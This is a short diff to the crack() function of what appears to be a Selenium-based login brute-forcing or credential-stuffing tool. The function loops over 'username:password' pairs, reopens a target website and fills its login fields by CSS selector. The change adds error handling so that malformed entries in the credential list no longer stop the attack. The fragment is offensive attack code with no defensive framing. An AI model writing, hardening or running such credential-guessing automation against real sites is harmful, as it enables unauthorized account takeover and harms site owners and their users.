@@ -106,8 +106,12 @@ def crack(username, usersel, passsel, passlist, website):
     print(color.GREEN + '\nTarget user: ' + color.RED + username + color.WHITE + '\n') # Print username of the target
     try: # Start the attack
         for cred in f: # Run the attack untill the password list is over
-            cred = cred.split(':')
-            username, password  =  cred[0], cred[1]
+            try:
+                cred = cred.split(':')
+                username, password  =  cred[0], cred[1]
+            except IndexError as e:
+                print(e)
+                continue
             browser.get(website) # Open fresh website
             Sel_user = WebDriverWait(browser, timeout=3).until(lambda d: d.find_element(By.CSS_SELECTOR, usersel))
             Sel_pass = WebDriverWait(browser, timeout=3).until(lambda d: d.find_element(By.CSS_SELECTOR, passsel))
